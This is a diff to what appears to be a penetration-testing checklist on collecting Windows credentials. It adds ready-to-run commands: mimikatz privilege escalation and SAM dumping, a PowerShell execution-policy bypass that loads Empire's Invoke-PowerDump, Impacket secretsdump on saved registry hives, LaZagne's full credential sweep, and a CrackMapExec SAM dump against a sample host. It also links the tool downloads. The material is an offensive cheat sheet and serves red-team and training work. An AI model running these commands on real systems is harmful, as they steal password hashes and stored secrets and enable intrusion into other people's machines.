@@ -19,6 +19,13 @@ List of loots to collect
   - binaries https://github.com/ParrotSec/mimikatz
   - project https://github.com/gentilkiwi/mimikatz
   - mimikatz cheatsheet https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49
+  
+  ```
+  privilege::debug
+  token::elevate
+  lsadump::sam
+  ```
+  
 - [ ] Pypykatz
   - https://github.com/skelsec/pypykatz
 - [ ] Nightmare Hive
@@ -31,4 +38,22 @@ List of loots to collect
 - [ ] PwDump7
   - Only for Windows7
   - https://www.tarasco.org/security/pwdump_7/pwdump7.zip
-  - 
+
+- [ ] Powershell Script
+  - https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
+  - `powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-PowerDump.ps1; Invoke-PowerDump}"`
+
+
+- [ ] Impacket
+  - `./secretsdump.py -sam /root/Desktop/sam -system /root/Desktop/system LOCAL`
+
+- [ ] lazagne.exe
+  - project https://github.com/AlessandroZ/LaZagne
+  - binaries https://github.com/AlessandroZ/LaZagne/releases/
+  - `lazagne.exe all`
+
+- [ ] CrackMapExec 
+  - `crackmapexec smb 192.168.1.105 -u 'AdministratorUsername' -p 'password1234' --sam`
+  
+### References
+- https://www.hackingarticles.in/credential-dumping-sam/
